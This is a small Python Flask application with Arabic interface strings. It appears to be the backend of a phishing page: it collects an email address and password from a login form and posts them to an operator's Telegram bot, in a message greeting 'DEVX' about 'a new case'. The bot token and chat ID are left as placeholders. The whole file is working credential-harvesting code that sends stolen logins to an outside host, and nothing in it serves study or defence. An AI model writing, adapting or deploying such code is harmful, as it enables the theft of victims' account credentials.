from flask import Flask, render_template, request, flash
import requests

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # ضروري للرسائل المؤقتة (flash)

BOT_TOKEN = "ضع_التوكن_هنا"
CHAT_ID = "ضع_الاي_دي_هنا"

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form.get('email', '').strip()
        password = request.form.get('password', '').strip()

        if not email or not password:
            flash("يرجى تعبئة البريد الإلكتروني وكلمة المرور.", "error")
            return render_template("index.html")

        message = f"سيدي DEVX لدينا حالة جديدة\n\nEmail: {email}\n\nPassword: {password}"
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": message}

        try:
            response = requests.post(url, data=data)
            if response.status_code == 200:
                flash("تم إرسال البيانات بنجاح.", "success")
            else:
                flash(f"حدث خطأ أثناء الإرسال: {response.text}", "error")
        except Exception as e:
            flash(f"حدث خطأ في الاتصال بتيليجرام: {e}", "error")

    return render_template("index.html")

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=4444)
